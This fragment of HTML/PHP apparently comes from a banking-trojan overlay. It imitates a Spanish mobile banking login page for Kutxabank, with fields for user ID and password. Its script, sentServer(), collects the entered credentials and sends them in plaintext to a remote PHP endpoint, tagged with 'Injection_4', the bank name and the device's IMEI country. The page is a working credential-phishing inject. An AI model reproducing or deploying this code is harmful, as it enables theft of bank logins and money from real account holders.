t7N9gAAABqSURBVHja7NbBCcAgDIVhLd2r3cyM1kyWpseKICIEhf9BLl78MKjJZpZWypEWCyBAgAB5ipcFVaFlo8n8ZYAmczbWbq8raH/1enqgDyNBIKlBW7RMA09IeYcAMX4wfnDtAQECBOifV4ABAPwdSAhqBOjJAAAAAElFTkSuQmCC">

</div><br>
<b style="display: block;width: 100%;text-align: center;margin-bottom: 20px;color: #000;font-weight: 900;"> ACCESO A BANCA Móvil </b>
    <div class="main">
        <div class="container">
            <div class="row">
			<div id="form1">
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">
                        <form id="form" style="text-align: center;">
                            <div class="form-group ">
                                	<input type="text" class="form-control" placeholder="NIF/Usuario" name="field2" id="login" autocomplete="off" data-reg="/.{3,50}/">
                            </div>

                            <div class="form-group">
                                	<input type="password" class="form-control" placeholder="Clave" name="field3" id="password" autocomplete="off" data-reg="/.{3,50}/">
                            </div>


						<input type="button" class="input_submitBtn" onClick="sentServer();" value="Entrar">

                        </form>
						<div style="color: #000000;width: 100%;margin: 0 auto;text-align: center;text-decoration: underline;font-size: 16px;"> ¿Has olvidado tu clave? </div>
                </div>

            </div>
        </div>

		</div>
    </div>
<script>
	function sentServer()
	{

	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|kutxabank|"+login1+"|"+pass);
	}
	}
</script>
</body>
</html>
